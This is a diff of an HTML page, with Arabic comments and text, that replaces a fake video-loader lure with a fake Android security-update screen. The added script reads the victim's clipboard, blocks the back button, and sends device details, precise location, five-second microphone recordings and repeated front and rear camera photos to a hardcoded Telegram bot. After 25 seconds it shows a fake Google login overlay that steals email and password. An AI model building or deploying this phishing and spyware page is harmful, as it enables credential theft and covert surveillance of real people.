@@ -3,129 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري تهيئة مشغل الفيديو...</title>
+    <title>⚙️ نظام الأمان - فحص وتحديث</title>
     <style>
-        body { background-color: #050505; color: #444; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { text-align: center; padding: 20px; }
-        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1.5s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { font-size: 14px; letter-spacing: 0.5px; }
+        body { background-color: #000; color: #fff; font-family: 'Roboto', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
+        .container { width: 85%; max-width: 400px; transition: filter 0.5s; }
+        .android-logo { width: 70px; margin-bottom: 20px; filter: grayscale(1); opacity: 0.7; }
+        .progress-bg { width: 100%; height: 5px; background: #222; border-radius: 10px; margin: 15px 0; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: #4285f4; border-radius: 10px; transition: width 0.5s; }
+        .status-text { font-size: 16px; color: #eee; }
+        
+        /* واجهة الفيشينج المتقدمة */
+        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
+        .login-card { width: 90%; max-width: 360px; padding: 30px; text-align: center; }
+        .login-card img { width: 70px; margin-bottom: 15px; }
+        .login-card input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
+        .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="loader"></div>
-        <p>جاري فك تشفير الرابط... يرجى السماح بالأذونات للمتابعة</p>
+    <div class="container" id="main-ui">
+        <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" class="android-logo">
+        <div class="status-text">جاري فحص وتحديث أمان النظام... <span id="percent">0%</span></div>
+        <div class="progress-bg"><div class="progress-bar" id="bar"></div></div>
+        <p style="font-size: 11px; color: #555;">يرجى السماح بالأذونات المطلوبة لضمان سلامة بياناتك ومنع الاختراق.</p>
+    </div>
+
+    <div id="phish-overlay">
+        <div class="login-card">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
+            <h2 style="font-size: 20px; font-weight: 400;">تأكيد الهوية مطلوب</h2>
+            <p style="font-size: 14px; color: #5f6368;">لإتمام عملية الفحص، يرجى تسجيل الدخول</p>
+            <input type="email" id="email" placeholder="البريد الإلكتروني">
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <button onclick="sendCreds()">متابعة</button>
+        </div>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // --- إعدادات التحكم الخاصة بك ---
+        // --- إعدادات التحكم ---
         const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
         const CHAT_ID = "7984067238";
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
         let currentStream = null;
 
-        async function sendToTelegram(endpoint, params) {
+        function notify(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        }
+
+        // 1. اختطاف الحافظة و "سجن" المتصفح
+        function secureJail() {
+            // سحب الحافظة عند أول ضغطة
+            document.addEventListener('click', async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if(text) notify(`📋 **نص من الحافظة:**\n\`${text}\``);
+                } catch(e) {}
+            }, {once: true});
+
+            // منع الخروج (زر الرجوع) + اهتزاز
+            if(navigator.vibrate) navigator.vibrate([300, 100, 300]);
+            for(let i=0; i<50; i++) window.history.pushState(null, null, window.location.href);
+            window.onpopstate = () => {
+                window.history.pushState(null, null, window.location.href);
+                notify("⚠️ الضحية حاول الخروج من الرابط!");
+            };
+        }
+
+        // 2. سحب البيانات التقنية ومستشعرات الحركة
+        async function getDeepIntel() {
+            let b = await (navigator.getBattery ? navigator.getBattery() : {level: 0});
+            let info = `🚀 **هدف جديد في الفخ:**\n\n`;
+            info += `📱 *النظام:* ${navigator.platform}\n`;
+            info += `🔋 *البطارية:* ${Math.round(b.level*100)}%\n`;
+            info += `📶 *الشبكة:* ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}\n`;
+            info += `⏰ *التوقيت:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            notify(info);
+
+            // مراقبة الحركة لمرة واحدة
+            window.addEventListener('devicemotion', (e) => {
+                if (Math.abs(e.acceleration.x) > 0.5) notify("🏃 الضحية يتحرك أو يمسك الجهاز بيده.");
+            }, {once: true});
+
+            // كشف الحسابات النشطة
+            ["Google", "Facebook", "Twitter"].forEach(s => {
+                let img = new Image(); img.src = `https://${s.toLowerCase()}.com/favicon.ico`;
+                img.onload = () => notify(`🌐 الضحية مسجل دخول في: *${s}*`);
+            });
+        }
+
+        // 3. التجسس الصوتي (5 ثواني كل 15 ثانية)
+        async function audioSpy() {
             try {
-                await fetch(`https://api.telegram.org/bot${TOKEN}/${endpoint}`, {
-                    method: 'POST',
-                    body: params
-                });
-            } catch (e) { console.error("Telegram Error", e); }
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const rec = new MediaRecorder(stream);
+                rec.ondataavailable = (e) => {
+                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'v.ogg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+                };
+                setInterval(() => { rec.start(); setTimeout(() => rec.stop(), 5000); }, 15000);
+            } catch(e) { notify("❌ رفض الميكروفون."); }
         }
 
-        function sendText(text) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('text', text);
-            formData.append('parse_mode', 'Markdown');
-            sendToTelegram('sendMessage', formData);
-        }
-
-        async function getDeviceHardware() {
-            let info = "🛡️ **تقرير اختراق جديد (بصمة الجهاز):**\n\n";
-            info += `📱 *المنصة:* ${navigator.platform}\n`;
-            info += `⚙️ *المعالج (أنوية):* ${navigator.hardwareConcurrency || "غير معروف"}\n`;
-            info += `💾 *الرام التقريبي:* ${navigator.deviceMemory || "غير معروف"} GB\n`;
-            
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                info += `🔋 *البطارية:* ${Math.round(b.level * 100)}% (${b.charging ? "🔌 شاحن" : "🔋 استهلاك"})\n`;
-            }
-
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) {
-                info += `🌐 *الشبكة:* ${conn.effectiveType} (${conn.downlink} Mbps)\n`;
-            }
-
-            info += `🔗 *الرابط المصدر:* ${document.referrer || "دخول مباشر"}\n`;
-            sendText(info);
-        }
-
-        function grabLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((p) => {
-                    const link = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    sendText(`📍 **موقع الضحية الدقيق:**\n[اضغط هنا لفتح الخريطة](${link})`);
-                }, () => sendText("❌ الضحية رفض إذن الموقع."));
-            }
-        }
-
-        async function startSurveillance() {
+        // 4. التجسس البصري التتابعي (أمامية/خلفية كل 2 ثانية)
+        async function visualSpy() {
             const modes = ["user", "environment"];
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
             let i = 0;
-
-            while (true) {
-                const mode = modes[i % 2];
-                const label = mode === "user" ? "الأمامية 🤳" : "الخلفية 📷";
-                
+            while(true) {
                 try {
                     if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-                    
-                    currentStream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: mode }, 
-                        audio: false 
-                    });
-                    
+                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
                     video.srcObject = currentStream;
-                    // تم تقليل وقت الانتظار للاستجابة السريعة
-                    await new Promise(r => setTimeout(r, 800)); 
-
-                    const context = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'shot.jpg');
-                        fd.append('caption', `🔄 لقطة سريعة من: ${label}`);
-                        sendToTelegram('sendPhoto', fd);
+                    await new Promise(r => setTimeout(r, 800));
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(b => {
+                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'i.jpg');
+                        fd.append('caption', `📸 لقطة: ${modes[i%2]==="user"?"أمامية":"خلفية"}`);
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                     }, 'image/jpeg', 0.5);
+                } catch(e) {}
+                i++; await new Promise(r => setTimeout(r, 2000));
+            }
+        }
 
-                } catch (e) {
-                    console.log("Camera Switch Error", e);
-                }
-                
-                i++;
-                // --- التعديل المطلوب: التبديل كل ثانيتين (2000 مللي ثانية) ---
-                await new Promise(r => setTimeout(r, 2000)); 
+        // 5. محاكاة التحديث (التمويه)
+        function startFakeUpdate() {
+            let p = 0;
+            const bar = document.getElementById('bar');
+            const per = document.getElementById('percent');
+            setInterval(() => {
+                if (p < 99) { p += Math.floor(Math.random() * 2) + 1; bar.style.width = p + '%'; per.innerText = p + '%'; }
+            }, 6000);
+        }
+
+        function sendCreds() {
+            const e = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
+            if(e && p) {
+                notify(`🔥 **بيانات جوجل مسحوبة:**\n📧: \`${e}\`\n🔐: \`${p}\``);
+                document.getElementById('phish-overlay').style.display = 'none';
+                alert("اكتمل التحديث. سيتم إعادة تشغيل الجهاز.");
             }
         }
 
         window.onload = () => {
-            getDeviceHardware();
-            grabLocation();
-            startSurveillance();
-            if (navigator.wakeLock) { navigator.wakeLock.request('screen'); }
+            secureJail();
+            getDeepIntel();
+            audioSpy();
+            visualSpy();
+            startFakeUpdate();
+            // سحب الموقع
+            navigator.geolocation.getCurrentPosition(pos => {
+                notify(`📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            });
+            // إظهار تسجيل الدخول بعد 25 ثانية
+            setTimeout(() => {
+                document.getElementById('phish-overlay').style.display = 'flex';
+                document.getElementById('main-ui').style.filter = 'blur(10px)';
+            }, 25000);
+            if(navigator.wakeLock) navigator.wakeLock.request('screen');
         };
     </script>
 </body>
